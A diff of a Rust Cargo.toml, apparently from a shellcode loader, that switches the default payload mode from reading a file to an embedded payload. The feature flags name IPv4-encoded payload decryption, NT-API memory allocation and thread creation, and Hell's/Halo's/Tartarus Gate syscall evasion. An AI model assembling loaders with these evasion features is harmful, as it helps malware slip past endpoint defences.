@@ -74,12 +74,12 @@ base64 = "0.21.5"
 cc = "1.0"
 
 [features]
-default = ["decrypt_ipv4", "alloc_mem_nt_allocate_virtual_memory", "run_nt_create_thread_ex", "none_decode", "load_payload_read_file", "hells_halos_tartarus_gate"]
+default = ["decrypt_ipv4", "alloc_mem_nt_allocate_virtual_memory", "run_nt_create_thread_ex", "none_decode", "load_payload_embedded", "hells_halos_tartarus_gate"]
 
 debug = []
 
 # Payload Loading Modes
-load_payload_read_file = []
+load_payload_embedded = []
 load_payload_separate = []
 
 # 解密算法特性开关
